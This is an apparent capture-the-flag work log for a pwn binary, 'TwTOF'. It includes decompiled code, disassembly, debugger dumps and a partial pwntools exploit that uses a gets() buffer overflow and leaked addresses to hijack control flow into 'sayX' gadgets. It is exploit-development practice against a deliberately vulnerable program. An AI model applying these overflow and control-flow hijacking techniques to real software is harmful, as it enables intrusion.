# challenge
Source, cleaner version edited from ghidra decompiled source, but missing some crucial functions 
```
void read_flag()
{
    // Opens and tries to read flag.txt
    int fd = open("./flag.txt", O_RDONLY);
    char buffer[0x1000];
    ssize_t n = read(fd, buffer, 0x1000);
    close(fd);

    // Authentication check again
    if (strcmp(&heard_msg, &msg3) == 0)
    {
        if (n > 0)
        {
            // Print some messages and flag content
            write(1, buffer, n);
        }
        else
        {
            // Print error message
            write(1, "TwT: ERROR, FLAG FILE MISSING OR EMPTY\n", 39);
        }
    }
}

int main(void)
{
    // Welcome message "Welcome to the world of TwT..."
    write(1, msg1, 0x33);

    // "You see TwT sitting on 0x"
    write(1, msg7, 0x19);

    // Format and print some addresses
    format_hex(&stack_buffer, &stack_buffer);
    write(1, &stack_buffer, 0x10);

    // ", crying about 0x"
    write(1, msg8, 0x11);

    // Format and print main's address
    format_hex(&stack_buffer, main);
    write(1, &stack_buffer, 0x10);

    // "..."
    write(1, msg11, 0x4);

    // "TwT: What... do... you... want...?"
    write(1, msg2, 0x23);

    // Vulnerable gets() call
    gets(&stack_buffer); // Buffer overflow vulnerability here

    // Compare input with msg3
    if (strcmp(&heard_msg, &msg3) == 0)
    {
        // "TwT: Wish granted"
        write(1, msg5, 0x18);
        read_flag();
    }
    else
    {
        // "TwT: I... can't... hear... clearly..."
        write(1, msg4, 0x26);
    }

    return 0;
}
```

```
**************************************************************
*                          FUNCTION                          *
**************************************************************
undefined main(undefined param_1, undefined param_2, und
undefined         AL:1           <RETURN>
undefined         DIL:1          param_1
undefined         SIL:1          param_2
undefined         DL:1           param_3
undefined         CL:1           param_4
undefined         R8B:1          param_5
undefined         R9B:1          param_6
undefined         Stack[0x8]:1   param_7
undefined1        Stack[0x10]:1  param_8                                 XREF[5]:     0010113c(*), 
                                                   00101151(*), 
                                                   00101179(*), 
                                                   00101193(*), 
                                                   001011da(*)  
main                                            XREF[2]:  entry:0010100e(c), 0010117d(*)  
001010f8 48 83 c4 08               ADD        RSP,0x8
001010fc 48 83 c4 08               ADD        RSP,0x8
00101100 55                        PUSH       RBP
00101101 48 83 c4 08               ADD        RSP,0x8
00101105 48 89 e5                  MOV        RBP,RSP
00101108 ba 33 00 00 00            MOV        param_3,0x33
0010110d 48 8d 35 ec 4e 00 00      LEA        param_2,[msg1]                                   = 57h    W
00101114 bf 01 00 00 00            MOV        param_1,0x1
00101119 b8 01 00 00 00            MOV        EAX,0x1
0010111e 0f 05                     SYSCALL
00101120 ba 19 00 00 00            MOV        param_3,0x19
00101125 48 8d 35 07 4f 00 00      LEA        param_2,[msg7]                                   = 59h    Y
0010112c bf 01 00 00 00            MOV        param_1,0x1
00101131 b8 01 00 00 00            MOV        EAX,0x1
00101136 0f 05                     SYSCALL
00101138 48 83 c4 10               ADD        RSP,0x10
0010113c 48 8d 7d 00               LEA        param_1=>param_8,[RBP]
00101140 48 89 ee                  MOV        param_2,RBP
00101143 48 83 c4 08               ADD        RSP,0x8
00101147 e8 62 ff ff ff            CALL       format_hex                                       undefined format_hex()
0010114c ba 10 00 00 00            MOV        param_3,0x10
00101151 48 8d 75 00               LEA        param_2=>param_8,[RBP]
00101155 bf 01 00 00 00            MOV        param_1,0x1
0010115a b8 01 00 00 00            MOV        EAX,0x1
0010115f 0f 05                     SYSCALL
00101161 ba 11 00 00 00            MOV        param_3,0x11
00101166 48 8d 35 df 4e 00 00      LEA        param_2,[msg8]                                   = 2Ch    ,
0010116d bf 01 00 00 00            MOV        param_1,0x1
00101172 b8 01 00 00 00            MOV        EAX,0x1
00101177 0f 05                     SYSCALL
00101179 48 8d 7d 00               LEA        param_1=>param_8,[RBP]
0010117d 48 8d 35 74 ff ff ff      LEA        param_2,[main]
00101184 90                        NOP
00101185 48 83 c4 08               ADD        RSP,0x8
00101189 e8 20 ff ff ff            CALL       format_hex                                       undefined format_hex()
0010118e ba 10 00 00 00            MOV        param_3,0x10
00101193 48 8d 75 00               LEA        param_2=>param_8,[RBP]
00101197 bf 01 00 00 00            MOV        param_1,0x1
0010119c b8 01 00 00 00            MOV        EAX,0x1
001011a1 0f 05                     SYSCALL
001011a3 ba 04 00 00 00            MOV        param_3,0x4
001011a8 48 8d 35 ae 4e 00 00      LEA        param_2,[msg11]                                  = 2Eh    .
001011af bf 01 00 00 00            MOV        param_1,0x1
001011b4 b8 01 00 00 00            MOV        EAX,0x1
001011b9 0f 05                     SYSCALL
001011bb ba 23 00 00 00            MOV        param_3,0x23
001011c0 48 8d 35 9a 4e 00 00      LEA        param_2,[msg2]                                   = 54h    T
001011c7 bf 01 00 00 00            MOV        param_1,0x1
001011cc b8 01 00 00 00            MOV        EAX,0x1
001011d1 0f 05                     SYSCALL
001011d3 48 81 c4 f0 0f 00 00      ADD        RSP,0xff0
001011da 48 8d 7d 00               LEA        param_1=>param_8,[RBP]
001011de 48 83 c4 08               ADD        RSP,0x8
001011e2 e8 35 fe ff ff            CALL       gets                                             char * gets(char * __s)
001011e7 48 8d 35 96 4e 00 00      LEA        param_2,[msg3]                                   = 49h    I
001011ee 48 8d 3d 0f 6e 00 00      LEA        param_1,[heard_msg]                              = ??
001011f5 90                        NOP
001011f6 48 83 c4 08               ADD        RSP,0x8
001011fa e8 6d fe ff ff            CALL       strcmp                                           int strcmp(char * __s1, char * _
001011ff 85 c0                     TEST       EAX,EAX
00101201 74 1a                     JZ         main1
00101203 ba 26 00 00 00            MOV        param_3,0x26
00101208 48 8d 35 04 4f 00 00      LEA        param_2,[msg4]                                   = 54h    T
0010120f bf 01 00 00 00            MOV        param_1,0x1
00101214 b8 01 00 00 00            MOV        EAX,0x1
00101219 0f 05                     SYSCALL
0010121b eb 21                     JMP        main2
main1                                           XREF[1]:  00101201(j)  
0010121d ba 18 00 00 00            MOV        param_3,0x18
00101222 48 8d 35 10 4f 00 00      LEA        param_2,[msg5]                                   = 54h    T
00101229 bf 01 00 00 00            MOV        param_1,0x1
0010122e b8 01 00 00 00            MOV        EAX,0x1
00101233 0f 05                     SYSCALL
00101235 48 83 c4 08               ADD        RSP,0x8
00101239 e8 19 00 00 00            CALL       read_flag                                        undefined read_flag(undefined pa
main2                                           XREF[1]:  0010121b(j)  
0010123e 31 c0                     XOR        EAX,EAX
00101240 48 89 ec                  MOV        RSP,RBP
00101243 48 83 ec 08               SUB        RSP,0x8
00101247 5d                        POP        RBP
00101248 48 83 ec 08               SUB        RSP,0x8
0010124c 48 83 ec 08               SUB        RSP,0x8
00101250 59                        POP        param_4
00101251 48 83 ec 08               SUB        RSP,0x8
00101255 ff e1                     JMP        param_4
```

```
  **************************************************************
  *                          FUNCTION                          *
  **************************************************************
  undefined format_hex()
undefined         AL:1           <RETURN>
  format_hex                                      XREF[2]:  main:00101147(c), 
                                                            main:00101189(c)  
001010ae 48 83 c4 08               ADD        RSP,0x8
001010b2 48 83 c4 08               ADD        RSP,0x8
001010b6 55                        PUSH       RBP
001010b7 48 83 c4 08               ADD        RSP,0x8
001010bb 48 89 e5                  MOV        RBP,RSP
001010be b9 10 00 00 00            MOV        ECX,0x10
  format_hex.digit_loop                           XREF[1]:  001010df(j)  
001010c3 48 c1 c6 04               ROL        RSI,0x4
001010c7 48 89 f2                  MOV        RDX,RSI
001010ca 48 83 e2 0f               AND        RDX,0xf
001010ce 48 8d 05 d8 50 00 00      LEA        RAX,[hex_lut]                                    = "0123456789abcdef./flag.txt"
001010d5 8a 14 10                  MOV        DL,byte ptr [RAX + RDX*0x1]=>hex_lut             = "0123456789abcdef./flag.txt"
001010d8 88 17                     MOV        byte ptr [RDI],DL
001010da 48 ff c7                  INC        RDI
001010dd ff c9                     DEC        ECX
001010df 75 e2                     JNZ        format_hex.digit_loop
001010e1 48 89 ec                  MOV        RSP,RBP
001010e4 48 83 ec 08               SUB        RSP,0x8
001010e8 5d                        POP        RBP
001010e9 48 83 ec 08               SUB        RSP,0x8
001010ed 48 83 ec 08               SUB        RSP,0x8
001010f1 59                        POP        RCX
001010f2 48 83 ec 08               SUB        RSP,0x8
001010f6 ff e1                     JMP        RCX
```

```
**************************************************************
*                          FUNCTION                          *
**************************************************************
undefined read_flag(undefined param_1, undefined param_2
undefined         AL:1           <RETURN>
undefined         DIL:1          param_1
undefined         SIL:1          param_2
undefined         DL:1           param_3
undefined         CL:1           param_4
undefined         R8B:1          param_5
undefined         R9B:1          param_6
undefined         Stack[0x8]:1   param_7
undefined1        Stack[0x10]:1  param_8                                 XREF[2]:     0010128d(*), 
00101314(*)  
read_flag                                       XREF[1]:  main:00101239(c)  
00101257 48 83 c4 08               ADD        RSP,0x8
0010125b 48 83 c4 08               ADD        RSP,0x8
0010125f 55                        PUSH       RBP
00101260 48 83 c4 08               ADD        RSP,0x8
00101264 48 89 e5                  MOV        RBP,RSP
00101267 48 81 c4 08 10 00 00      ADD        RSP,0x1008
0010126e be 00 00 00 00            MOV        param_2,0x0
00101273 48 8d 3d 43 4f 00 00      LEA        param_1,[filename]                               = "./flag.txt"
0010127a b8 02 00 00 00            MOV        EAX,0x2
0010127f 0f 05                     SYSCALL
00101281 48 89 85 00 10 00 00      MOV        qword ptr [RBP + 0x1000],RAX
00101288 ba 00 10 00 00            MOV        param_3,0x1000
0010128d 48 8d 75 00               LEA        param_2=>param_8,[RBP]
00101291 48 89 c7                  MOV        param_1,RAX
00101294 31 c0                     XOR        EAX,EAX
00101296 0f 05                     SYSCALL
00101298 48 8b bd 00 10 00 00      MOV        param_1,qword ptr [RBP + 0x1000]
0010129f 48 89 85 00 10 00 00      MOV        qword ptr [RBP + 0x1000],RAX
001012a6 b8 03 00 00 00            MOV        EAX,0x3
001012ab 0f 05                     SYSCALL
001012ad 48 8d 35 d0 4d 00 00      LEA        param_2,[msg3]                                   = 49h    I
001012b4 48 8d 3d 49 6d 00 00      LEA        param_1,[heard_msg]                              = ??
001012bb 90                        NOP
001012bc 48 83 c4 08               ADD        RSP,0x8
001012c0 e8 a7 fd ff ff            CALL       strcmp                                           int strcmp(char * __s1, char * _
001012c5 85 c0                     TEST       EAX,EAX
001012c7 74 1a                     JZ         read_flag2
001012c9 ba 30 00 00 00            MOV        param_3,0x30
001012ce 48 8d 35 7c 4e 00 00      LEA        param_2,[msg6]                                   = 54h    T
001012d5 bf 01 00 00 00            MOV        param_1,0x1
001012da b8 01 00 00 00            MOV        EAX,0x1
001012df 0f 05                     SYSCALL
001012e1 eb 5b                     JMP        read_flag_end
read_flag2                                      XREF[1]:  001012c7(j)  
001012e3 48 8b 85 00 10 00 00      MOV        RAX,qword ptr [RBP + 0x1000]
001012ea 48 85 c0                  TEST       RAX,RAX
001012ed 74 37                     JZ         read_flag3
001012ef 48 83 f8 00               CMP        RAX,0x0
001012f3 7c 31                     JL         read_flag3
001012f5 ba 05 00 00 00            MOV        param_3,0x5
001012fa 48 8d 35 80 4e 00 00      LEA        param_2,[msg9]                                   = "TwT: TwT: ERROR, FLAG FILE MI
00101301 bf 01 00 00 00            MOV        param_1,0x1
00101306 b8 01 00 00 00            MOV        EAX,0x1
0010130b 0f 05                     SYSCALL
0010130d 48 8b 95 00 10 00 00      MOV        param_3,qword ptr [RBP + 0x1000]
00101314 48 8d 75 00               LEA        param_2=>param_8,[RBP]
00101318 bf 01 00 00 00            MOV        param_1,0x1
0010131d b8 01 00 00 00            MOV        EAX,0x1
00101322 0f 05                     SYSCALL
00101324 eb 18                     JMP        read_flag_end
read_flag3                                      XREF[2]:  001012ed(j), 001012f3(j)  
00101326 ba 27 00 00 00            MOV        param_3,0x27
0010132b 48 8d 35 54 4e 00 00      LEA        param_2,[msg10]                                  = "TwT: ERROR, FLAG FILE MISSING
00101332 bf 01 00 00 00            MOV        param_1,0x1
00101337 b8 01 00 00 00            MOV        EAX,0x1
0010133c 0f 05                     SYSCALL
read_flag_end                                   XREF[2]:  001012e1(j), 00101324(j)  
0010133e 31 c0                     XOR        EAX,EAX
00101340 e9 ce fc ff ff            JMP        end
```
# goal 
The goal on the surface is to write the following to `heard_msg`
```
pwndbg> x/32s 0x562d5cf36084
0x562d5cf36084:	"I want the flag (˚ ˃̣̣̥⌓˂̣̣̥ ) I want the flag .·°՞(¯□¯)՞°·. I want the flag ૮(˶╥︿╥)ა I want the flag 🥺 plz"
```

and here, these `sayX` functions writes stuff the `heard_msg` 
```
Dump of assembler code for function say1:
0x0000562d5cf31383 <+0>:	add    rsp,0x8
0x0000562d5cf31387 <+4>:	add    rsp,0x8
0x0000562d5cf3138b <+8>:	push   rbp
0x0000562d5cf3138c <+9>:	add    rsp,0x8
0x0000562d5cf31390 <+13>:	mov    rbp,rsp
0x0000562d5cf31393 <+16>:	mov    ecx,DWORD PTR [rip+0x6c67]        # 0x562d5cf38000
0x0000562d5cf31399 <+22>:	lea    rax,[rip+0x6c64]        # 0x562d5cf38004
0x0000562d5cf313a0 <+29>:	mov    BYTE PTR [rax+rcx*1],0x1
0x0000562d5cf313a4 <+33>:	inc    DWORD PTR [rip+0x6c56]        # 0x562d5cf38000
0x0000562d5cf313aa <+39>:	mov    rsp,rbp
0x0000562d5cf313ad <+42>:	sub    rsp,0x8
0x0000562d5cf313b1 <+46>:	pop    rbp
0x0000562d5cf313b2 <+47>:	sub    rsp,0x8
0x0000562d5cf313b6 <+51>:	sub    rsp,0x8
0x0000562d5cf313ba <+55>:	pop    rcx
0x0000562d5cf313bb <+56>:	sub    rsp,0x8
0x0000562d5cf313bf <+60>:	jmp    rcx
End of assembler dump.
pwndbg> disass say2
Dump of assembler code for function say2:
0x0000562d5cf313c1 <+0>:	add    rsp,0x8
0x0000562d5cf313c5 <+4>:	add    rsp,0x8
0x0000562d5cf313c9 <+8>:	push   rbp
0x0000562d5cf313ca <+9>:	add    rsp,0x8
0x0000562d5cf313ce <+13>:	mov    rbp,rsp
0x0000562d5cf313d1 <+16>:	mov    ecx,DWORD PTR [rip+0x6c29]        # 0x562d5cf38000
0x0000562d5cf313d7 <+22>:	lea    rax,[rip+0x6c26]        # 0x562d5cf38004
0x0000562d5cf313de <+29>:	mov    BYTE PTR [rax+rcx*1],0x2
0x0000562d5cf313e2 <+33>:	inc    DWORD PTR [rip+0x6c18]        # 0x562d5cf38000
0x0000562d5cf313e8 <+39>:	mov    rsp,rbp
0x0000562d5cf313eb <+42>:	sub    rsp,0x8
0x0000562d5cf313ef <+46>:	pop    rbpv
0x0000562d5cf313f0 <+47>:	sub    rsp,0x8
0x0000562d5cf313f4 <+51>:	sub    rsp,0x8
0x0000562d5cf313f8 <+55>:	pop    rcx
0x0000562d5cf313f9 <+56>:	sub    rsp,0x8
0x0000562d5cf313fd <+60>:	jmp    rcx

```
and it's up to say255

`say1` writes `0x1`, `say2` writes `0x2`, etc.   
so I guess just use `gets` overflow vuln to keep calling them, in the correct order to write 

anyways I am goign to try calling the say in order to write these 

```
msg3                                            XREF[2]:  main:001011e7(*), 
                                                         read_flag:001012ad(*)  
00106084 49                        ??         49h    I
00106085 20                        ??         20h     
00106086 77                        ??         77h    w
00106087 61                        ??         61h    a
00106088 6e                        ??         6Eh    n
00106089 74                        ??         74h    t
0010608a 20                        ??         20h     
0010608b 74                        ??         74h    t
0010608c 68                        ??         68h    h
0010608d 65                        ??         65h    e
0010608e 20                        ??         20h     
0010608f 66                        ??         66h    f
00106090 6c                        ??         6Ch    l
00106091 61                        ??         61h    a
00106092 67                        ??         67h    g
00106093 20                        ??         20h     
00106094 28                        ??         28h    (
00106095 cb                        ??         CBh
00106096 9a                        ??         9Ah
00106097 20                        ??         20h     
00106098 cb                        ??         CBh
...
...
...
```

## starting to overflow 
what I have right now:
```
[+] Stack address: 0x7ffffffedcf0
[+] Main address: 0x5555555550f8
[+] Binary base: 0x555555554000
```
`.text` address can obviously be used to calculate the offset to those 
` Stack` address, this points exactly to rbp. I am not so sure what is this for, maybe there are some other vulnerabilities?

`gets` buffer start from rbp+0x0, above the return address at `main+239`
```
  0x0000562d5cf311da <+226>:	lea    rdi,[rbp+0x0]
   0x0000562d5cf311de <+230>:	add    rsp,0x8
   0x0000562d5cf311e2 <+234>:	call   0x562d5cf3101c <gets>
```
above the return address at `main+239`
```
00:0000│ rsp 0x7ffd3a6c1bd0 —▸ 0x561f418f31e7 (main+239) ◂— lea rsi, [rip + 0x4e96]
01:0008│     0x7ffd3a6c1bd8 —▸ 0x7ffd3a6c0bd0 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\n'
02:0010│     0x7ffd3a6c1be0 —▸ 0x7ffd3a6c0c34 ◂— 0xa /* '\n' */
03:0018│     0x7ffd3a6c1be8 ◂— 0
```
now I am at the point of filling the 0x1000 buffer up to overwrite return address at `main+239` and able to write bytes to the heard_msg array
```
► 0x564d6c5224f3 <say73>       add    rsp, 8                            RSP => 0x7fff9dcc1618 (0x7fff9dcc1610 + 0x8)
   0x564d6c5224f7 <say73+4>     add    rsp, 8                            RSP => 0x7fff9dcc1620 (0x7fff9dcc1618 + 0x8)
   0x564d6c5224fb <say73+8>     push   rbp
   0x564d6c5224fc <say73+9>     add    rsp, 8                            RSP => 0x7fff9dcc1620 (0x7fff9dcc1618 + 0x8)
   0x564d6c522500 <say73+13>    mov    rbp, rsp                          RBP => 0x7fff9dcc1620 —▸ 0x7fff9dcc160b ◂— 0x5224f3303030300a
   0x564d6c522503 <say73+16>    mov    ecx, dword ptr [rip + 0x5af7]     ECX, [heard] => 0
   0x564d6c522509 <say73+22>    lea    rax, [rip + 0x5af4]               RAX => 0x564d6c528004 (heard_msg) ◂— 0
   0x564d6c522510 <say73+29>    mov    byte ptr [rax + rcx], 0x49        [heard_msg] <= 0x49
   0x564d6c522514 <say73+33>    inc    dword ptr [rip + 0x5ae6]          [heard] <= 1
   0x564d6c52251a <say73+39>    mov    rsp, rbp                          RSP => 0x7fff9dcc1620 —▸ 0x7fff9dcc160b ◂— 0x5224f3303030300a
   0x564d6c52251d <say73+42>    sub    rsp, 8                            RSP => 0x7fff9dcc1618 (0x7fff9dcc1620 - 0x8)
──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────
00:0000│ rsp 0x7fff9dcc1610 —▸ 0x564d6c5224f3 (say73) ◂— add rsp, 8
```
but the problem is that, it is not a typical ROP chain of the structure of the sayX function 
```
                             say73
  001024f3 48 83 c4 08               ADD        RSP,0x8
  001024f7 48 83 c4 08               ADD        RSP,0x8
  001024fb 55                        PUSH       RBP
  001024fc 48 83 c4 08               ADD        RSP,0x8
  00102500 48 89 e5                  MOV        RBP,RSP
  00102503 8b 0d f7 5a 00 00         MOV        ECX,dword ptr [heard]
  00102509 48 8d 05 f4 5a 00 00      LEA        RAX,[heard_msg]                                  = ??
  00102510 c6 04 08 49               MOV        byte ptr [RAX + RCX*0x1]=>heard_msg,0x49         = ??
  00102514 ff 05 e6 5a 00 00         INC        dword ptr [heard]
  0010251a 48 89 ec                  MOV        RSP,RBP
  0010251d 48 83 ec 08               SUB        RSP,0x8
  00102521 5d                        POP        RBP
  00102522 48 83 ec 08               SUB        RSP,0x8
  00102526 48 83 ec 08               SUB        RSP,0x8
  0010252a 59                        POP        RCX
  0010252b 48 83 ec 08               SUB        RSP,0x8
  0010252f ff e1                     JMP        RCX
```
which would keep popping return address of the exact same function to `rcx` and keeps returning to that. For example, if the above is called, it would just keeps writing letter `I` to `heard_msg`.

My current testing exploit:
```py
from pwn import * 

binary = "./TwTOF"
p = process(binary)
elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'

s = '''
b * main+234
b * main+239
b * say73
b * say65
'''
gdb.attach(p, s)

# Receive until "TwT sitting on 0x"
p.recvuntil(b"sitting on 0x")

# Get stack address (16 hex chars)
stack_addr = int(p.recv(16), 16)
log.success(f"Stack address: {hex(stack_addr)}")

# Receive until "crying about 0x"
p.recvuntil(b"crying about 0x")

# Get main address (16 hex chars)
main_addr = int(p.recv(16), 16)
log.success(f"Main address: {hex(main_addr)}")

# Calculate binary base (main_addr - main_offset)
elf.address = main_addr - elf.symbols['main']
log.success(f"Binary base: {hex(elf.address)}")

# Now you have:
# - stack_addr: leaked stack address
# - main_addr: leaked main address
# - binary_base: calculated base address of binary
p.recvuntil("TwT: What... do... you... want...?")
pop_rcx = 0x0000000000001065 + elf.address
ret = 0x0000000000002e39 + elf.address
payload = flat(
    stack_addr, # rbp, does not have to write with stack_addr, it doesn't seem to matter 
    b'0' * 0xff8, 
    elf.sym['say73'], # loops here until rcx gets very very large, cannot dereference the array and crashes
    stack_addr+0x1068, # starting point of 'X'
    b'X' * 0xff8
)
p.sendlineafter("\n", payload)
p.interactive()
```
one more weird thing is that `b'X' * 0xff8`, these 'X' starts at offset `0x1068` from stack_addr but not following right after `elf.sym['say73']`


## to do : 1

chaining the `sayX` functions properly